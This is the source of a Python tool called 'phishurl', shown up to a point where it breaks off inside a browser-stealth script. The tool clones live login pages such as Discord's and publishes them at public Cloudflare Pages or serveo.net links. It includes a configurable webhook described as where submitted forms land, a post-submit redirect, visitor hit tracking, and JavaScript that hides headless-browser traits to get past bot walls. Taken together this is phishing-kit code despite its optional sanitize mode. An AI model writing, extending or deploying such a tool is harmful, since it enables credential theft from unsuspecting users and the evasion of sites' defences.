#!/usr/bin/env python3
"""
phishurl — mirror a page, heal it, publish it.

A single-file page cloner: renders the live DOM with Playwright, keeps every response
body the browser actually received, pulls every asset the page references, rewrites
those references in place — attribute value spans only, so nothing else in the document
is re-serialised — runs six quality gates over the local mirror and heals what fails,
zips the result, and hands it either to Cloudflare Pages for a
https://<project>.pages.dev URL or to serveo.net for a public link in one click.

    python phishurl.py serve              # web UI on http://127.0.0.1:8000
    python phishurl.py clone <url>        # CLI, no UI
    python phishurl.py clone <url> --tunnel   # mirror it, then publish it publicly
    python phishurl.py deploy <dir>       # CLI deploy to cloudflare pages
    python phishurl.py tunnel <dir>       # serve a folder on serveo.net, ctrl-c to stop

Dependencies
    pip install playwright httpx beautifulsoup4 lxml tinycss2 rich fastapi uvicorn \
                sse-starlette python-multipart aiofiles pyyaml
    python -m playwright install chromium

Credentials (env, .env or config.yaml; never logged, never echoed back)
    CF_API_TOKEN        Pages:Edit token
    CF_ACCOUNT_ID       account id that owns the project
    CF_PROJECT_PREFIX   optional, default "phishurl"

Behaviour notes
    The mirror loads the page the way an anonymous browser does — no auth bypass, no
    paywall or bot-wall circumvention — so the copy is what a cold visitor gets. With
    `sanitize` on, every form action is pinned to "#" and a submit guard is injected,
    so a cloned login cannot post anywhere.
"""

from __future__ import annotations

import argparse
import asyncio
import atexit
import base64
import contextlib
import functools
import hashlib
import http.server
import io
import json
import mimetypes
import os
import platform
import posixpath
import re
import shutil
import socketserver
import struct
import subprocess
import sys
import threading
import time
import uuid
import zipfile
import zlib
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Iterable, Optional
from urllib.parse import parse_qsl, quote, unquote, urljoin, urlparse, urlunparse

APP = "phishurl"
VERSION = "1.0.0"
TAGLINE = "exact mirror · self-heal · public link"

OUT_ROOT = Path("phishurl_out")
ASSET_DIR = "assets"
ZIP_NAME = "mirror.zip"

# One UA pool, rotated per attempt. A single request that fails with one client
# often answers another, and rotating is cheaper than classifying the failure.
UA_POOL = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
)

HTTP_TIMEOUT = 25.0
RENDER_TIMEOUT_MS = 45_000
NETWORK_IDLE_MS = 8_000
DOWNLOAD_RETRIES = 3
PER_ASSET_CAP = 32 * 1024 * 1024          # 32 MB for one file
MAX_PAGES = 25                            # depth 2 ceiling, whatever --depth says
HEAL_ITERATIONS = 6
CF_POLL_INTERVAL = 3.0
CF_POLL_TIMEOUT = 180.0

CONTENT_KIND = {
    "text/css": "css",
    "text/javascript": "js",
    "application/javascript": "js",
    "application/x-javascript": "js",
    "text/html": "html",
    "image/svg+xml": "svg",
    "image/png": "png",
    "image/jpeg": "jpg",
    "image/gif": "gif",
    "image/webp": "webp",
    "image/avif": "avif",
    "image/x-icon": "ico",
    "image/vnd.microsoft.icon": "ico",
    "font/woff2": "woff2",
    "font/woff": "woff",
    "font/ttf": "ttf",
    "font/otf": "otf",
    "application/json": "json",
    "application/manifest+json": "json",
    "video/mp4": "mp4",
    "video/webm": "webm",
    "audio/mpeg": "mp3",
}

def _blank_png(width: int = 1, height: int = 1) -> bytes:
    """A transparent PNG, built instead of pasted.

    Three chunks, CRC'd by hand: no opaque hex blob in the source, no pillow, no
    base64 of a file nobody can read. A 1x1 RGBA row is 4 bytes plus a filter byte,
    so the deflate stream is trivial and the result is a spec-clean PNG.
    """
    def chunk(tag: bytes, payload: bytes) -> bytes:
        return (struct.pack(">I", len(payload)) + tag + payload
                + struct.pack(">I", zlib.crc32(tag + payload) & 0xFFFFFFFF))

    header = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)   # 8-bit RGBA
    raw = b"".join(b"\x00" + b"\x00" * (width * 4) for _ in range(height))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header)
            + chunk(b"IDAT", zlib.compress(raw, 9)) + chunk(b"IEND", b""))


# used when an image cannot be recovered and the gate would otherwise fail on a
# broken icon nobody would ever look at.
PNG_PLACEHOLDER = _blank_png()

# ---------------------------------------------------------------------------
# optional dependencies, resolved once
#
# The tool has to run on a fresh machine even when half the extras are missing, so
# every optional import degrades to an explicit fallback instead of a traceback at
# startup. Nothing here is silent: `CAPS` is printed by `doctor` and shown in the UI.
# ---------------------------------------------------------------------------

CAPS: dict[str, bool] = {}


def _try(name: str) -> Any:
    try:
        module = __import__(name, fromlist=["*"])
        CAPS[name] = True
        return module
    except Exception:
        CAPS[name] = False
        return None


bs4 = _try("bs4")
tinycss2 = _try("tinycss2")
rich = _try("rich")
yaml = _try("yaml")
aiofiles = _try("aiofiles")
sse_starlette = _try("sse_starlette")
httpx = _try("httpx")
playwright_mod = _try("playwright")
fastapi_mod = _try("fastapi")
uvicorn_mod = _try("uvicorn")

from dataclasses import asdict  # noqa: E402  (kept next to the models below)

# ---------------------------------------------------------------------------
# 2. config
#
# Precedence is env > .env > config.yaml > defaults. Tokens live in this object and
# nowhere else: they are never put in a job, a log line, an SSE event or an API
# response, which is why every read of them goes through `Config.redacted()` when a
# human has to look.
# ---------------------------------------------------------------------------


@dataclass
class Config:
    cf_api_token: str = ""
    cf_account_id: str = ""
    cf_project_prefix: str = "phishurl"
    proxy: str = ""
    out_dir: str = "phishurl_out"
    max_assets: int = 5000
    max_bytes: int = 200 * 1024 * 1024
    concurrency: int = 8
    sanitize: bool = True
    webhook: str = ""            # where a submitted form lands
    redirect: str = ""           # where the visitor goes after the post
    tunnel: str = "cloudflare"   # "cloudflare" (quick tunnel first) or "fastest"
    # the look: a named palette, two accents, a wallpaper the operator chose, and
    # how hard the scrim sits over it. the palette is six keys in the UI; these two
    # colours are the only values that must survive a restart.
    theme_preset: str = "aurora"
    theme_accent: str = "#7c5cff"
    theme_accent2: str = "#22d3ee"
    theme_dim: int = 36
    theme_wall: str = ""         # file name inside the theme directory

    def has_cloudflare(self) -> bool:
        """A token is the whole credential. The account id resolves itself."""
        return bool(self.cf_api_token)

    def redacted(self) -> dict[str, Any]:
        return {
            "cf_api_token": ("set · " + self.cf_api_token[:4] + "…") if self.cf_api_token else "missing",
            "cf_account_id": self.cf_account_id or "auto · from the token",
            "cf_project_prefix": self.cf_project_prefix,
            "proxy": self.proxy or "direct",
            "out_dir": self.out_dir,
            "max_assets": self.max_assets,
            "max_bytes": self.max_bytes,
            "concurrency": self.concurrency,
            # a webhook url is a bearer token: say it is armed, never print it
            "webhook": "armed · " + urlparse(self.webhook).netloc if self.webhook else "off",
            "redirect": self.redirect or "none",
            "tunnel": self.tunnel,
        }


def _read_dotenv(path: Path) -> dict[str, str]:
    """Tiny .env reader. `export KEY=value`, quotes and `#` comments are handled;
    anything else is left alone rather than guessed at."""
    found: dict[str, str] = {}
    if not path.is_file():
        return found
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return found
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        if line.lower().startswith("export "):
            line = line[7:]
        key, _, value = line.partition("=")
        key = key.strip()
        value = value.strip().strip('"').strip("'")
        if key:
            found[key] = value
    return found


def load_config(path: Optional[Path] = None) -> Config:
    cfg = Config()
    here = Path.cwd()
    yaml_path = path or (here / "config.yaml")
    if yaml_path.is_file() and yaml is not None:
        try:
            loaded = yaml.safe_load(yaml_path.read_text(encoding="utf-8")) or {}
            if isinstance(loaded, dict):
                for key in ("cf_api_token", "cf_account_id", "cf_project_prefix",
                            "proxy", "out_dir", "webhook", "redirect", "tunnel",
                            "theme_preset", "theme_accent", "theme_accent2",
                            "theme_wall"):
                    if loaded.get(key):
                        setattr(cfg, key, str(loaded[key]))
                for key in ("max_assets", "max_bytes", "concurrency", "theme_dim"):
                    if loaded.get(key):
                        setattr(cfg, key, int(loaded[key]))
                if "sanitize" in loaded:
                    cfg.sanitize = bool(loaded["sanitize"])
        except Exception as exc:  # a broken yaml must not stop the tool
            print(f"! config.yaml ignored: {exc}", file=sys.stderr)

    dotenv = _read_dotenv(here / ".env")
    for key, target in (("CF_API_TOKEN", "cf_api_token"), ("CF_ACCOUNT_ID", "cf_account_id"),
                        ("CF_PROJECT_PREFIX", "cf_project_prefix"), ("PHISHURL_PROXY", "proxy"),
                        ("PHISHURL_WEBHOOK", "webhook"), ("PHISHURL_REDIRECT", "redirect"),
                        ("PHISHURL_TUNNEL", "tunnel")):
        value = os.environ.get(key) or dotenv.get(key)
        if value:
            setattr(cfg, target, value)
    for key, target, cast in (("PHISHURL_MAX_ASSETS", "max_assets", int),
                              ("PHISHURL_MAX_BYTES", "max_bytes", int),
                              ("PHISHURL_CONCURRENCY", "concurrency", int)):
        raw = os.environ.get(key) or dotenv.get(key)
        if raw:
            with contextlib.suppress(ValueError):
                setattr(cfg, target, cast(raw))
    return cfg


CONFIG = load_config()

# ---------------------------------------------------------------------------
# 3. models
# ---------------------------------------------------------------------------


@dataclass
class Options:
    """Everything a job needs. The UI and the CLI build the same object."""

    url: str
    render: bool = True
    sanitize: bool = True
    deploy: bool = False
    project: str = ""
    proxy: str = ""
    depth: int = 1
    max_assets: int = 5000
    respect_robots: bool = False
    concurrency: int = 8
    webhook: str = ""
    redirect: str = ""

    @classmethod
    def from_payload(cls, payload: dict[str, Any]) -> "Options":
        raw_url = str(payload.get("url") or "").strip()
        if not raw_url:
            raise ValueError("url is required")
        if "://" not in raw_url:
            scheme = "http" if is_local_host(raw_url) else "https"
            raw_url = f"{scheme}://" + raw_url
        parsed = urlparse(raw_url)
        if parsed.scheme not in ("http", "https") or not parsed.netloc:
            raise ValueError(f"not an http(s) url: {raw_url}")

        def num(key: str, default: int, low: int, high: int) -> int:
            try:
                value = int(payload.get(key, default))
            except (TypeError, ValueError):
                value = default
            return max(low, min(high, value))

        def endpoint(key: str, fallback: str) -> str:
            """A capture sink or a bounce target. Only http(s) survives — anything
            else in that slot turns into a javascript: url inside a mirrored page."""
            value = str(payload.get(key) or fallback or "").strip()
            if not value:
                return ""
            if not value.lower().startswith(("http://", "https://")):
                return ""
            return value[:600]

        return cls(
            url=norm_url(raw_url),
            render=bool(payload.get("render", True)),
            sanitize=bool(payload.get("sanitize", CONFIG.sanitize)),
            deploy=bool(payload.get("deploy", False)),
            project=str(payload.get("project") or "")[:64],
            proxy=str(payload.get("proxy") or CONFIG.proxy or ""),
            depth=num("depth", 1, 1, 2),
            max_assets=num("max_assets", CONFIG.max_assets, 1, 20000),
            respect_robots=bool(payload.get("respect_robots", False)),
            concurrency=num("concurrency", CONFIG.concurrency, 1, 24),
            webhook=endpoint("webhook", CONFIG.webhook),
            redirect=endpoint("redirect", CONFIG.redirect),
        )


@dataclass
class Asset:
    url: str
    kind: str = "other"
    status: str = "pending"          # pending · fetching · done · failed · placeholder
    size: int = 0
    local: str = ""
    content_type: str = ""
    sha1: str = ""
    attempts: int = 0
    error: str = ""
    rewritten: bool = False
    via: str = ""                    # network · dom · css · inline

    def public(self) -> dict[str, Any]:
        return {"url": self.url, "kind": self.kind, "status": self.status,
                "size": self.size, "local": self.local, "attempts": self.attempts,
                "error": self.error}


@dataclass
class Page:
    url: str
    local: str = "index.html"
    status: str = "pending"
    size: int = 0
    html: str = ""
    rendered: bool = False
    error: str = ""
    text_len: int = 0          # visible text in the live page, the render gate's baseline
    gate: dict[str, Any] = field(default_factory=dict)


@dataclass
class HealEvent:
    iteration: int
    gate: str
    diagnosis: str
    action: str
    outcome: str
    ts: str = field(default_factory=lambda: utcnow())

    def public(self) -> dict[str, Any]:
        return {"iteration": self.iteration, "gate": self.gate, "diagnosis": self.diagnosis,
                "action": self.action, "outcome": self.outcome, "ts": self.ts}


@dataclass
class Deployment:
    project: str
    url: str = ""
    deployment_id: str = ""
    status: str = "pending"
    error: str = ""
    ts: str = field(default_factory=lambda: utcnow())


@dataclass
class Job:
    id: str
    options: Options
    status: str = "queued"           # queued · running · done · failed
    phase: str = "queued"
    created: str = field(default_factory=lambda: utcnow())
    finished: str = ""
    pages: list[Page] = field(default_factory=list)
    assets: dict[str, Asset] = field(default_factory=dict)
    bytes: int = 0
    failures: int = 0
    gates: dict[str, dict[str, Any]] = field(default_factory=dict)
    heals: list[HealEvent] = field(default_factory=list)
    deployment: Optional[Deployment] = None
    events: list[dict[str, Any]] = field(default_factory=list)
    error: str = ""
    mirror: str = ""
    zip_path: str = ""
    url: str = ""
    # The page the mirror opens on. A target of /login is written to login/index.html,
    # so "index.html at the root" is simply wrong for most targets — this is the file
    # the preview frame, the tunnel root and the publish gate all point at.
    entry: str = ""
    hits: list[dict[str, Any]] = field(default_factory=list)
    # origin the console is served from. The collector beacons hits there only when
    # the page is being viewed on loopback — the operator's own preview — so a
    # visitor's browser never gets asked to poke a port on their own machine.
    app_base: str = ""
    _subscribers: list[asyncio.Queue] = field(default_factory=list, repr=False)
    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)

    # -- pub/sub ------------------------------------------------------------
    def subscribe(self) -> asyncio.Queue:
        queue: asyncio.Queue = asyncio.Queue(maxsize=4000)
        self._subscribers.append(queue)
        return queue

    def unsubscribe(self, queue: asyncio.Queue) -> None:
        with contextlib.suppress(ValueError):
            self._subscribers.remove(queue)

    def emit(self, event: dict[str, Any]) -> None:
        """One place where a job talks. The event is stored for reconnect and pushed
        to every live subscriber; a full queue drops the subscriber's oldest message
        rather than stalling the pipeline."""
        event = {"ts": utcnow(), **event}
        self.events.append(event)
        if len(self.events) > 6000:
            del self.events[:2000]
        for queue in list(self._subscribers):
            if queue.full():
                with contextlib.suppress(asyncio.QueueEmpty):
                    queue.get_nowait()
            with contextlib.suppress(asyncio.QueueFull):
                queue.put_nowait(event)

    def log(self, message: str, level: str = "info") -> None:
        self.emit({"event": "log", "level": level, "message": message})

    def phase_set(self, phase: str, note: str = "") -> None:
        self.phase = phase
        self.emit({"event": "phase", "phase": phase, "note": note})

    # -- snapshot -----------------------------------------------------------
    def snapshot(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "status": self.status,
            "phase": self.phase,
            "url": self.options.url,
            "created": self.created,
            "finished": self.finished,
            "options": {"url": self.options.url, "render": self.options.render,
                        "sanitize": self.options.sanitize, "deploy": self.options.deploy,
                        "project": self.options.project, "depth": self.options.depth,
                        "max_assets": self.options.max_assets,
                        "capture": bool(self.options.webhook)},
            "pages": [{"url": p.url, "local": p.local, "status": p.status, "size": p.size,
                       "rendered": p.rendered, "error": p.error} for p in self.pages],
            "assets": [a.public() for a in self.assets.values()],
            "counts": {"assets": len(self.assets), "done": self.done_count(),
                       "failed": self.failures, "bytes": self.bytes},
            "gates": self.gates,
            "heals": [h.public() for h in self.heals],
            "deployment": asdict(self.deployment) if self.deployment else None,
            "mirror": self.mirror,
            "entry": self.entry,
            "hits": self.hits[-60:],
            "zip": bool(self.zip_path),
            "error": self.error,
            "done_url": self.url,
        }

    def done_count(self) -> int:
        return sum(1 for a in self.assets.values() if a.status in ("done", "placeholder"))

# ---------------------------------------------------------------------------
# 4. utilities
# ---------------------------------------------------------------------------


def utcnow() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def human_bytes(size: int) -> str:
    value = float(size)
    for unit in ("B", "KB", "MB", "GB"):
        if value < 1024 or unit == "GB":
            return f"{value:.1f} {unit}" if unit != "B" else f"{int(value)} B"
        value /= 1024.0
    return f"{value:.1f} GB"


def slugify(text: str, limit: int = 42) -> str:
    """A cloudflare project name: lowercase, digits and dashes, never starting or
    ending with a dash, never two in a row."""
    cleaned = re.sub(r"[^a-z0-9]+", "-", (text or "").lower()).strip("-")
    cleaned = re.sub(r"-{2,}", "-", cleaned)[:limit].strip("-")
    return cleaned or "mirror"


LOCAL_HOST_RE = re.compile(
    r"^(localhost|127\.\d+\.\d+\.\d+|0\.0\.0\.0|\[::1\]|::1|[\w-]+\.(?:local|test|localhost))"
    r"(?::\d+)?(?:/|$)", re.I)


def is_local_host(url: str) -> bool:
    """Loopback and .local names speak plain http; everything else gets https first."""
    host = url.split("://")[-1].split("/")[0]
    return bool(LOCAL_HOST_RE.match(host))


def swap_scheme(url: str) -> str:
    parsed = urlparse(url)
    other = "http" if parsed.scheme == "https" else "https"
    return urlunparse((other, parsed.netloc, parsed.path, parsed.params, parsed.query, ""))


def norm_url(url: str) -> str:
    """Normalise a URL for identity: fragment dropped, host lowercased, path kept."""
    parsed = urlparse(url.strip())
    scheme = parsed.scheme.lower() or "https"
    netloc = parsed.netloc.lower()
    path = parsed.path or "/"
    return urlunparse((scheme, netloc, path, parsed.params, parsed.query, ""))


def origin_of(url: str) -> str:
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def same_origin(a: str, b: str) -> bool:
    return origin_of(a) == origin_of(b)


def ext_from_url(url: str) -> str:
    path = unquote(urlparse(url).path)
    ext = posixpath.splitext(path)[1].lower()
    if ext and re.fullmatch(r"\.[a-z0-9]{1,6}", ext):
        return ext
    return ""


def kind_from_url(url: str) -> str:
    ext = ext_from_url(url)
    return {
        ".css": "css", ".js": "js", ".mjs": "js", ".json": "json", ".html": "html",
        ".htm": "html", ".svg": "svg", ".png": "png", ".jpg": "jpg", ".jpeg": "jpg",
        ".gif": "gif", ".webp": "webp", ".avif": "avif", ".ico": "ico",
        ".woff": "woff", ".woff2": "woff2", ".ttf": "ttf", ".otf": "otf",
        ".mp4": "mp4", ".webm": "webm", ".mp3": "mp3", ".pdf": "pdf",
    }.get(ext, "other")


def ext_for(kind: str, url: str = "") -> str:
    ext = ext_from_url(url)
    if ext:
        return ext
    return {
        "css": ".css", "js": ".js", "json": ".json", "html": ".html", "svg": ".svg",
        "png": ".png", "jpg": ".jpg", "gif": ".gif", "webp": ".webp", "ico": ".ico",
        "woff2": ".woff2", "woff": ".woff", "ttf": ".ttf", "otf": ".otf",
        "mp4": ".mp4", "webm": ".webm", "mp3": ".mp3", "pdf": ".pdf",
    }.get(kind, ".bin")


def safe_segment(segment: str, limit: int = 90) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9._@+-]", "_", segment)
    cleaned = re.sub(r"_{2,}", "_", cleaned).strip("._") or "file"
    if len(cleaned) > limit:
        stem, dot, ext = cleaned.rpartition(".")
        if dot and len(ext) <= 6:
            cleaned = stem[: limit - len(ext) - 1] + "." + ext
        else:
            cleaned = cleaned[:limit]
    return cleaned


def safe_path(path: str) -> str:
    """A relative posix path that cannot escape the mirror directory."""
    parts: list[str] = []
    for raw in (path or "").replace("\\", "/").split("/"):
        if raw in ("", ".", ".."):
            continue
        parts.append(safe_segment(raw))
    return "/".join(parts) or "index.html"


def page_relpath(url: str) -> str:
    parsed = urlparse(url)
    path = unquote(parsed.path or "/")
    if path.endswith("/"):
        path += "index.html"
    elif not posixpath.splitext(path)[1]:
        path += "/index.html"
    return safe_path(path.lstrip("/"))


def asset_relpath(url: str, kind: str = "other") -> str:
    """Where one asset lands on disk: assets/<host>/<path>, query folded into the
    filename so two versions of `app.js?v=1` and `?v=2` do not collide."""
    parsed = urlparse(url)
    host = safe_segment(parsed.netloc or "host", 70)
    path = unquote(parsed.path or "/").lstrip("/")
    if not path or path.endswith("/"):
        path += "index" + ext_for(kind, url)
    if not posixpath.splitext(path)[1]:
        path += ext_for(kind, url)
    if parsed.query:
        stem, ext = posixpath.splitext(path)
        digest = hashlib.sha1(parsed.query.encode("utf-8")).hexdigest()[:8]
        path = f"{stem}-{digest}{ext}"
    return safe_path(f"{ASSET_DIR}/{host}/{path}")


def relref(from_rel: str, to_rel: str) -> str:
    """The href a file at `from_rel` needs to reach `to_rel`, both mirror-relative."""
    from_dir = posixpath.dirname(from_rel) or "."
    value = posixpath.relpath(to_rel, from_dir)
    return value.replace("\\", "/")


def sha1_of(data: bytes) -> str:
    return hashlib.sha1(data).hexdigest()


def sha256_of_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1 << 16), b""):
            digest.update(block)
    return digest.hexdigest()


def mirror_path(root: Path, rel: str) -> Path:
    return root.joinpath(*rel.split("/"))


def mirror_entry(root: Path, job: Optional["Job"] = None) -> str:
    """The file a visitor landing on the mirror should get.

    A target of example.com/login is written to login/index.html, so the root of the
    mirror has no index.html and every naive open — the preview frame, the tunnel,
    the publish gate — 404s. The job remembers its first page; this is the lookup
    that turns that into a path, with a disk scan as the last resort.
    """
    candidates: list[str] = []
    if job is not None and job.entry:
        candidates.append(job.entry)
    if job is not None:
        candidates.extend(page.local for page in job.pages)
    candidates.append("index.html")
    for rel in candidates:
        if rel and mirror_path(root, rel).is_file():
            return rel
    best = ""
    for path in root.rglob("*.html"):
        rel = path.relative_to(root).as_posix()
        if path.name.startswith(SEAL_PREFIX):   # a sealed copy is never the entry
            continue
        if not best or (rel.count("/"), rel) < (best.count("/"), best):
            best = rel
    return best


def write_bytes(root: Path, rel: str, data: bytes) -> Path:
    target = mirror_path(root, rel)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_bytes(data)
    return target


# ---------------------------------------------------------------------------
# 2c. the seal
#
# A real login page carries its stylesheet tree as <link> tags — discord alone
# ships 359 of them, 2.0 MB of CSS. Over a free tunnel every one of those is a
# separate round trip through an edge that throttles, and a handful failing
# leaves the page with its layout gone: unstyled boxes, serif fallback, fields
# floating over the background. Which handful fails is different on every reload,
# so the same link looks broken in a new way each time it is opened.
#
# Sealing folds the local sheets into the entry document, in order, with every
# url() rebased to the entry's own directory. One request for the whole look
# instead of three hundred and fifty-nine.
# ---------------------------------------------------------------------------

SEAL_BYTES = 16 * 1024 * 1024        # past this the <link> tags stay where they are
SEAL_ONE = 6 * 1024 * 1024           # a single sheet this big is not folded either
SEAL_PREFIX = "_sealed."             # <prefix><entry name> sits beside the entry
LINK_TAG_RE = re.compile(r"<link\b[^>]*>", re.I)
CSS_URL_RE = re.compile(r"""url\(\s*(?P<quote>['"]?)(?P<value>[^)'"]*)(?P=quote)\s*\)""", re.I)
TAG_ATTR_RE = re.compile(r"""([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""")
OFF_SITE_RE = re.compile(r"^(?:[a-zA-Z][a-zA-Z0-9+.-]*:|//)")


def tag_attrs(tag: str) -> dict[str, str]:
    """Attributes of one start tag, lower-cased names, unquoted values included."""
    out: dict[str, str] = {}
    for match in TAG_ATTR_RE.finditer(tag):
        name = match.group(1).lower()
        out[name] = next((value for value in match.groups()[1:] if value is not None), "")
    return out


def rebase_css(css: str, css_rel: str, page_dir: str) -> str:
    """Re-express every relative url() in a sheet from the page's directory.

    The rewriter already turned network references into mirror-relative paths —
    relative to *the sheet*. Moving the text into the document changes the base,
    so each reference is resolved against the sheet and written back against the
    page. Anything with a scheme, a fragment, or a path that climbs out of the
    mirror is left exactly as it is.
    """
    if "url(" not in css.lower():
        return css
    sheet_dir = posixpath.dirname(css_rel)

    def swap(match: re.Match[str]) -> str:
        raw = match.group("value").strip()
        if not raw or raw.startswith("#") or OFF_SITE_RE.match(raw):
            return match.group(0)
        if raw.startswith("/"):
            # a root-absolute reference already means "the mirror root" and means
            # the same thing from every directory; rewriting it would be a lie
            return match.group(0)
        path = raw.split("#")[0].split("?")[0]
        if not path:
            return match.group(0)
        target = posixpath.normpath(posixpath.join(sheet_dir, path.lstrip("/")))
        if target.startswith("..") or target == ".":
            return match.group(0)
        quote_mark = match.group("quote") or '"'
        value = relref(posixpath.join(page_dir, "_"), target) if page_dir else target
        return "url(" + quote_mark + value + quote_mark + ")"

    return CSS_URL_RE.sub(swap, css)


def seal_document(root: Path, entry: str, force: bool = False) -> str:
    """Fold the entry's local stylesheets into one self-contained document.

    The sealed file is written next to the entry — same directory, so every
    relative reference it keeps still means what it meant. Returns the path of
    the document to serve, which is the entry itself when nothing could be
    folded.
    """
    source = mirror_path(root, entry)
    if not source.is_file() or posixpath.basename(entry).startswith(SEAL_PREFIX):
        return entry
    page_dir = posixpath.dirname(entry)
    name = SEAL_PREFIX + posixpath.basename(entry)
    sealed_rel = posixpath.join(page_dir, name) if page_dir else name
    target = mirror_path(root, sealed_rel)
    if (not force and target.is_file()
            and target.stat().st_mtime >= source.stat().st_mtime):
        return sealed_rel

    html = source.read_text(encoding="utf-8", errors="replace")
    ops: list[tuple[int, int, str]] = []
    total = 0
    for match in LINK_TAG_RE.finditer(html):
        attrs = tag_attrs(match.group(0))
        if "stylesheet" not in attrs.get("rel", "").lower():
            continue
        href = attrs.get("href", "").strip()
        if not href or OFF_SITE_RE.match(href):
            continue
        path = href.split("#")[0].split("?")[0]
        css_rel = posixpath.normpath(
            path.lstrip("/") if path.startswith("/") else posixpath.join(page_dir, path))
        css_file = mirror_path(root, css_rel)
        if not css_file.is_file() or css_file.stat().st_size > SEAL_ONE:
            continue
        if total > SEAL_BYTES:
            break
        css = css_file.read_text(encoding="utf-8", errors="replace")
        if "</style" in css.lower():        # a sheet that could close the block: leave it linked
            continue
        total += len(css)
        media = attrs.get("media", "").strip()
        head = '<style data-src="' + href.replace('"', "") + '"'
        if media:
            head += ' media="' + media.replace('"', "") + '"'
        ops.append((match.start(), match.end(),
                    head + ">\n" + rebase_css(css, css_rel, page_dir) + "\n</style>"))
    if not ops:
        return entry
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(_apply_ops(html, ops), encoding="utf-8")
    return sealed_rel


def public_entry(root: Path, job: Optional["Job"] = None) -> str:
    """The document a public visitor lands on: the entry, sealed when it can be.

    A seal that fails is a slower page, not a broken publish — the plain entry is
    the fallback and it is the same file the gates already scored.
    """
    entry = mirror_entry(root, job)
    if not entry:
        return ""
    try:
        return seal_document(root, entry)
    except Exception:                     # noqa: BLE001 - never cost the publish
        return entry


def write_text(root: Path, rel: str, text: str) -> Path:
    return write_bytes(root, rel, text.encode("utf-8"))


def read_text(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def clean_rel(url: str) -> str:
    """Protocol-relative, empty and javascript: refs are not assets."""
    value = (url or "").strip().strip("\"'")
    if not value:
        return ""
    low = value.lower()
    if low.startswith(("data:", "javascript:", "mailto:", "tel:", "about:", "blob:",
                       "#", "chrome:", "edge:")):
        return ""
    return value


def absolutize(base: str, ref: str) -> str:
    ref = clean_rel(ref).replace("&amp;", "&")
    if not ref:
        return ""
    if ref.startswith("//"):
        scheme = urlparse(base).scheme or "https"
        return norm_url(f"{scheme}:{ref}")
    return norm_url(urljoin(base, ref))


def project_name(options: Options, url: str) -> str:
    """Explicit name wins; otherwise prefix + host + a short hash of the path so two
    mirrors of the same host get two projects instead of overwriting each other."""
    if options.project:
        return slugify(options.project)
    host = urlparse(url).netloc.split(":")[0].replace("www.", "")
    digest = hashlib.sha1(norm_url(url).encode("utf-8")).hexdigest()[:6]
    prefix = CONFIG.cf_project_prefix or "phishurl"
    return slugify(f"{prefix}-{host}-{digest}")


def decode_body(data: bytes, content_type: str) -> str:
    charset = "utf-8"
    match = re.search(r"charset=([\w-]+)", content_type or "", re.I)
    if match:
        charset = match.group(1)
    for codec in (charset, "utf-8", "cp1252", "latin-1"):
        try:
            return data.decode(codec)
        except (UnicodeDecodeError, LookupError):
            continue
    return data.decode("utf-8", errors="replace")


def md5_short(text: str, size: int = 8) -> str:
    return hashlib.md5(text.encode("utf-8")).hexdigest()[:size]


STRIP_EMBEDDED_RE = re.compile(r"<(script|style|template)\b.*?</\1\s*>", re.I | re.S)
STRIP_TAG_RE = re.compile(r"<[^<>]*>")
SPACE_RUN_RE = re.compile(r"\s+")


def visible_len(html: str) -> int:
    """Characters a reader would see, cheaply.

    Used for one decision only: whether the bytes the server sent are the page, or
    whether a client-side script built the page after those bytes landed. A shell is
    short here while the rendered DOM is long.
    """
    text = STRIP_EMBEDDED_RE.sub(" ", html or "")
    text = STRIP_TAG_RE.sub(" ", text)
    return len(SPACE_RUN_RE.sub(" ", text).strip())

# ---------------------------------------------------------------------------
# 5. browser renderer
#
# The page is captured as a browser sees it: after load, after a scroll pass that
# triggers lazy images, and after the network goes quiet. Without that pass, half
# of a modern page is `<img data-src>` and a skeleton.
# ---------------------------------------------------------------------------


class RenderError(RuntimeError):
    pass


# A bot wall reads the same six tells in the first fifty milliseconds: the
# HeadlessChrome token in the user agent, `navigator.webdriver`, an empty plugin
# list, a missing `window.chrome`, a permissions object that answers differently,
# and a software WebGL vendor. discord.com serves a challenge interstitial to all
# six, and a challenge page has no login form to mirror. This script closes them
# before any other script on the page runs.
STEALTH_JS = """
(() => {
  try { Object.defineProperty(navigator, 'webdriver', {get: () => undefined}); } catch (e) {}
  try { Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']}); } catch (e) {}
  try {
    if (!navigator.plugins || navigator.plugins.length === 0) {
      Object.defineProperty(navigator, 'plugins', {get: () => [
        {name: 'PDF Viewer'}, {name: 'Chrome PDF Viewer'}, {name: 'Chromium PDF Viewer'}
      ]});
    }
  } catch (e) {}
  try { if (!window.chrome) window.chrome = {runtime: {}}; } catch (e) {}
  try {
    const query = navigator.permissions && navigator.permissions.query;
    if (query) {
      navigator.permissions.query = (params) => (params && params.name === 'notifications')
        ? Promise.resolve({state: Notification.permission, onchange: null})
        : query.call(navigator.permissions, params);
    }
  } catch (e) {}
  try {
    const proto = window.WebGLRenderingContext && WebGLRenderingContext.prototype;
    if (proto && proto.getParameter) {
